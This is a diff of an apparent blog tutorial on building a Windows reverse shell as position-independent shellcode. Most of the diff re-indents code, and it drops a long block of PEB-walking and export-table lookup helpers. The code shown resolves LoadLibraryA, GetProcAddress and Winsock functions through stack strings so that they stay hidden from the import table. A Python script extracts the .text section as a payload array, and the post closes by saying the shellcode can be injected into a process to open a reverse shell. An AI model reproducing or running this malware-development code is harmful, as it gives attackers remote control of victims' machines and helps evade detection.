@@ -276,36 +276,37 @@ These APIs will allow us to load other DLLs even if not loaded by the resulting 
 
 ```c
 
-    char get_proc_addr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' }; 
+char get_proc_addr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' }; 
 
-    LPVOID getprocaddress_addr = get_func_by_name( kernel32dll_base, get_proc_addr );
-    if( NULL == getprocaddress_addr )
-    {
-        // printf( "[!] Could not find function! Exiting!\n" );
-        return 1;
-    }
-    // printf( "[+] Found GetProcAddress!\n" );
+LPVOID getprocaddress_addr = get_func_by_name( kernel32dll_base, get_proc_addr );
+if( NULL == getprocaddress_addr )
+{
+    // printf( "[!] Could not find function! Exiting!\n" );
+    return 1;
+}
+// printf( "[+] Found GetProcAddress!\n" );
 
-    char load_library[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };    
-    LPVOID loadlibrarya_addr = get_func_by_name( kernel32dll_base, load_library );
-    if( loadlibrarya_addr == NULL )
-    {
-        // printf( "[!] Could not find function! Exiting!\n" );
-        return 1;
-    }
-    // printf( "[+] Found LoadLibraryA!\n" );
-    
-    //
-    // Dynamically resolve LoadLibraryA/GetProcAddress
-    //
-    HMODULE( WINAPI * _LoadLibraryA )( LPCSTR lpLibFileName )                = ( HMODULE(WINAPI*)(LPCSTR))loadlibrarya_addr;
-    FARPROC( WINAPI * _GetProcAddress)( HMODULE hModule, LPCSTR lpProcName ) = ( FARPROC (WINAPI*)(HMODULE, LPCSTR))getprocaddress_addr;
+char load_library[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };    
+LPVOID loadlibrarya_addr = get_func_by_name( kernel32dll_base, load_library );
+if( loadlibrarya_addr == NULL )
+{
+    // printf( "[!] Could not find function! Exiting!\n" );
+    return 1;
+}
+// printf( "[+] Found LoadLibraryA!\n" );
 
-    if( NULL == _LoadLibraryA && NULL == _GetProcAddress)
-    {
-        // printf( "[!] LoadLibraryA or GetProcAddress could not be resolved!\n" );
-        return 1;
-    }
+//
+// Dynamically resolve LoadLibraryA/GetProcAddress
+//
+HMODULE( WINAPI * _LoadLibraryA )( LPCSTR lpLibFileName )                = ( HMODULE(WINAPI*)(LPCSTR))loadlibrarya_addr;
+FARPROC( WINAPI * _GetProcAddress)( HMODULE hModule, LPCSTR lpProcName ) = ( FARPROC (WINAPI*)(HMODULE, LPCSTR))getprocaddress_addr;
+
+if( NULL == _LoadLibraryA && NULL == _GetProcAddress)
+{
+    // printf( "[!] LoadLibraryA or GetProcAddress could not be resolved!\n" );
+    return 1;
+}
+
 ```
 
 ## Position Independent Code for a Reverse Shell
@@ -313,41 +314,43 @@ These APIs will allow us to load other DLLs even if not loaded by the resulting 
 Once we’ve dynamically resolved those two functions, we can load other modules and API’s that reside within that module. For example, for reverse shell/network operations, we’ll use APIs within `ws2_32.dll` . Here’s how we can get the address of that DLL, along with `WSAStartup()` which is an API function needed for network operations.
 
 ```c
-    //
-    // Get address of ws2_32.dll
-    //
-    char ws2_32dll[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', '\0' }; 
-    LPVOID ws2_32dll_base = _LoadLibraryA( ws2_32dll );
 
-    if( NULL == ws2_32dll_base )
-    {
-        // printf( "[+] Could not find ws2_32.dll!\n" );
-        return 1;
-    }
-    
-    //
-    // 1. INITIALIZE SOCKET LIBRARY USING WSAStartup()
-    // Dynamically resolve WSAStartUp WinAPI
-    // 
-    char wsastartup[] = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', '\0' };
+//
+// Get address of ws2_32.dll
+//
+char ws2_32dll[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', '\0' }; 
+LPVOID ws2_32dll_base = _LoadLibraryA( ws2_32dll );
 
-    int( WINAPI * _WSAStartup)
-    (
-        WORD      wVersionRequired,
-        LPWSADATA lpWSAData
-    );
+if( NULL == ws2_32dll_base )
+{
+    // printf( "[+] Could not find ws2_32.dll!\n" );
+    return 1;
+}
 
-    _WSAStartup = ( int(WINAPI *)
-    (
-        WORD      wVersionRequired,
-        LPWSADATA lpWSAData
-    )) _GetProcAddress( (HMODULE)ws2_32dll_base, wsastartup );
+//
+// 1. INITIALIZE SOCKET LIBRARY USING WSAStartup()
+// Dynamically resolve WSAStartUp WinAPI
+// 
+char wsastartup[] = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', '\0' };
 
-    if( NULL == _WSAStartup )
-    {
-        // printf( "[+] Could not dynamically resolve _WSAStartup!\n" );
-        return 1;
-    }
+int( WINAPI * _WSAStartup)
+(
+    WORD      wVersionRequired,
+    LPWSADATA lpWSAData
+);
+
+_WSAStartup = ( int(WINAPI *)
+(
+    WORD      wVersionRequired,
+    LPWSADATA lpWSAData
+)) _GetProcAddress( (HMODULE)ws2_32dll_base, wsastartup );
+
+if( NULL == _WSAStartup )
+{
+    // printf( "[+] Could not dynamically resolve _WSAStartup!\n" );
+    return 1;
+}
+
 ```
 
 In the case of `WSAStartup`, we use a similar approach as with `GetProcAddress` and `LoadLibraryA`  to dynamically resolve the function's address:
@@ -359,6 +362,7 @@ In the case of `WSAStartup`, we use a similar approach as with `GetProcAddress` 
 This process can be repeated to essentially refactor code to be position independent. The follow code below is from [https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html](https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html) which shows how to program a reverse shell in C/C++.
 
 ```c
+
 //
 // code inspired from https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html
 // 
@@ -406,11 +410,13 @@ int main(int argc, char* argv[])
 
     return 0;
 }
+
 ```
 
-We can refactor all of the WinAPIs used in the above code to become position indepent, similar to the example above with `WSAStartup`. Below is the code that’s been refactored to be position independent (final code, along with the header file containing the PEB structures can be found on my github here: https://github.com/0xEct0/Shellcode-Generate/blob/main/code_templates/rev_shell.c )
+We can refactor all of the WinAPIs used in the above code to become position indepent, similar to the example above with `WSAStartup`. Below is the code that’s been refactored to be position independent (final code, along with the header file containing the PEB structures can be found on my github [here](https://github.com/0xEct0/Shellcode-Generate/blob/main/code_templates/rev_shell.c) )
 
 ```c
+
 #include <stdio.h>
 #include <winsock2.h>
 #include <windows.h>
@@ -797,215 +803,6 @@ int main( void )
     return 0;
 }
 
-//
-// This function gets the base address of the module being searched
-// 
-inline LPVOID get_module_by_name( wchar_t* module_name )
-{
-    // w// printf( L"[*] Finding address of module: %ls\n", module_name );
-    //
-    // Access the PEB from GS register offset x60
-    // 
-    PPEB peb = NULL;
-    peb = ( PPEB )__readgsqword( 0x60 ); 
-
-    //
-    // Get the Ldr to find the module list
-    // 
-    // printf( "[*] Found address of peb->Ldr: %p\n", peb->Ldr );
-    PPEB_LDR_DATA ldr = peb->Ldr;
-    LIST_ENTRY module_list = ldr->InLoadOrderModuleList;
-
-    PLDR_DATA_TABLE_ENTRY front_link = *( (PLDR_DATA_TABLE_ENTRY*)(&module_list) );
-    PLDR_DATA_TABLE_ENTRY current_link = front_link;
-    
-    LPVOID return_module = NULL;
-
-    // 
-    // Go through the doubly linked list
-    // 
-    wchar_t current_module[1032];
-
-    while( current_link != NULL && current_link->DllBase != NULL ) 
-    {   
-        USHORT buffer_len = current_link->BaseDllName.Length / sizeof( WCHAR );
-        USHORT i = 0;
-
-        //
-        // Reset the current_module string
-        //
-        for( i = 0; i < 1032; i++ )
-        {
-            current_module[i] = '\0';
-        }
-        
-        // printf( "[*] Found BaseDllName: " );
-        
-        for( i = 0; i < buffer_len; i++ )
-        {
-            current_module[i] = TO_LOWER( current_link->BaseDllName.Buffer[i] );
-        }
-
-        // wprintf( L"current_module: %ls\n", current_module );
-         
-        for( i = 0; i < buffer_len && module_name[i] != '\0'; i++ )
-        {
-            if( TO_LOWER( current_link->BaseDllName.Buffer[i] ) != module_name[i] )
-            {
-                break;
-            }
-
-            //
-            // If i == buffer_len - 1 and hasn't broken out of the loop - it's the module we're looking for!
-            // 
-            if( i == buffer_len - 1 )
-            {
-                // printf("[*] Found a matching module name!\n");
-                return_module = current_link->DllBase;
-                return return_module;
-            }
-        }
-
-        //
-        // Check to make sure the next does not equal NULL
-        // Might be redundant with while loop condition...
-        //
-        if( (PLDR_DATA_TABLE_ENTRY)current_link->InLoadOrderLinks.Flink == NULL )
-        {
-            break;
-        }
-        
-        //
-        // Go to next item on the linked list
-        // 
-        current_link = ( PLDR_DATA_TABLE_ENTRY )current_link->InLoadOrderLinks.Flink;
-    }
-
-    // printf( "[+] Error?\n" );
-    return return_module;
-}
-
-//
-// This function gets the function address from the module
-// 
-inline LPVOID get_func_by_name( LPVOID module, char* function_name )
-{
-    LPVOID return_address = NULL;
-    
-    // printf( "[*] Getting address of function: %s\n", function_name );
-
-    // 
-    // Check if magic bytes are correct ("MZ")
-    // 
-    IMAGE_DOS_HEADER* dos_header = ( IMAGE_DOS_HEADER* )module;
-    if( dos_header->e_magic != IMAGE_DOS_SIGNATURE)
-    {
-        return NULL;
-    }
-
-    // printf( "[*] Magic bytes are \"MZ\"\n" );
-
-    //
-    // Get address of the PE Header (e_lfanew)
-    // PE Header contains data directories, which are pointers to important data in the executable, such as the import and export tables
-    //
-    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + dos_header->e_lfanew);
-
-    // 
-    // Get the exports directory - contains functions exported by the module
-    // The export directory is in the 0th index of the DataDirectory
-    // 
-    IMAGE_DATA_DIRECTORY* exports_directory = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
-    if (exports_directory->VirtualAddress == NULL) 
-    {
-        return NULL;
-    }
-
-    // printf( "[*] Found the exports directory\n" );
-
-    //
-    // Get the relative virtual address of the export table
-    //
-    DWORD export_table_rva = exports_directory->VirtualAddress;
-
-    //
-    // Calculate the absolute address of the export directory by adding the VirtualAddress to the base address of the module
-    //
-    IMAGE_EXPORT_DIRECTORY* export_table_aa = ( IMAGE_EXPORT_DIRECTORY* )( export_table_rva + (ULONG_PTR)module );
-    SIZE_T namesCount = export_table_aa->NumberOfNames;
-
-    //
-    // Retrieves the number of function names
-    // Also gets RVAs of lists of function addresses, function names, and name ordinals
-    // 
-    DWORD function_list_rva = export_table_aa->AddressOfFunctions;
-    DWORD function_names_rva = export_table_aa->AddressOfNames;
-    DWORD ordinal_names_rva = export_table_aa->AddressOfNameOrdinals;
-
-    //
-    // Loop through names of functions exported by module
-    // Attempts to find function whose name matches the func_name parameter
-    // 
-    for( SIZE_T i = 0; i < namesCount; i++ )
-    {
-        //
-        // Calculate the virtual address of the FUNCTION NAME at the i-th position in the exported names table
-        //
-        DWORD* name_va  = ( DWORD* )( function_names_rva + (BYTE*)module + i * sizeof(DWORD));
-        
-        //
-        // Calculate the virtual address of the ORDINAL NUMBER of the function name at the i-th position in the exported names table
-        //
-        WORD* index = ( WORD* )( ordinal_names_rva + (BYTE*)module + i * sizeof(WORD));
-        
-        //
-        // Calculate the virtual address of the FUNCTION'S ADDRESS corresponding to the i-th function name in the exported names table
-        //
-        DWORD* function_address_va = ( DWORD* )( function_list_rva + (BYTE*)module + (*index) * sizeof(DWORD) );
-
-        //
-        // Calculate the function name's (name_va) absolute address
-        //
-        LPSTR current_name = ( LPSTR )( *name_va + (BYTE*)module);
-        
-        //
-        // Compare the characters and return if function is the module found
-        //
-        size_t j = 0;
-        /*
-        // printf( "[*] Found function: " );
-        
-        for( j = 0; function_name[j] != '\0' && current_name[j] != 0; j++ )
-        {
-            // printf( "%c", current_name[j] );
-        }
-        // printf( "\n" );
-        */ 
-        //
-        // Compare the target function name to current function name
-        // 
-        for( j = 0; function_name[j] != '\0' && current_name[j] != 0; j++ )
-        {
-            if( TO_LOWER(function_name[j]) != TO_LOWER(current_name[j]) )
-            {
-                break;
-            }
-
-            //
-            // If j = the length of both and we haven't broken out of loop, we have a matching function!
-            // Return the absoluste address of the function
-            //
-            if( function_name[j + 1] == '\0' && current_name[j + 1] == 0 )
-            {
-                return_address = (BYTE*)module + (*function_address_va);
-                return return_address;
-            }
-        }
-    }
-
-    return return_address;
-}
-
 ```
 
 ## From PIC to Shellcode
@@ -1049,21 +846,25 @@ Once those steps are done, link to an exe using:  `ml64.exe rev_shell.asm /link 
 Last to extract the shellcode, you can use a tool like CFF Explorer or use the PE module within python3 to extract the shellcode from the `.text` section which will be the resulting shellcode. The following is python3 code to extract it.
 
 {% raw %}
-    pe = pefile.PE( "fixed_main.exe" )
-    text_section = next((s for s in pe.sections if s.Name.decode().strip('\x00') == '.text'), None)
-    
-    if not text_section:
-        print("No .text section found in the executable.")
-        return
+```python
 
-    text_bytes = text_section.get_data()
+pe = pefile.PE( "fixed_main.exe" )
+text_section = next((s for s in pe.sections if s.Name.decode().strip('\x00') == '.text'), None)
 
-    print( "[+] Successfully extracted .text section from the executable" )
-    
-    with open( "shellcode.text", "w" ) as file:
-        c_array = ', '.join( f'0x{byte:02x}' for byte in text_bytes )
-        formatted_c_array = f'unsigned char payload[] = {{ {c_array} }};'
-        file.write( formatted_c_array + "\n" )
+if not text_section:
+    print("No .text section found in the executable.")
+    return
+
+text_bytes = text_section.get_data()
+
+print( "[+] Successfully extracted .text section from the executable" )
+
+with open( "shellcode.text", "w" ) as file:
+    c_array = ', '.join( f'0x{byte:02x}' for byte in text_bytes )
+    formatted_c_array = f'unsigned char payload[] = {{ {c_array} }};'
+    file.write( formatted_c_array + "\n" )
+
+```
 {% endraw %}
 
 We can then use the shellcode in any process injection or shellcode execution technique which will connect to a reverse shell!
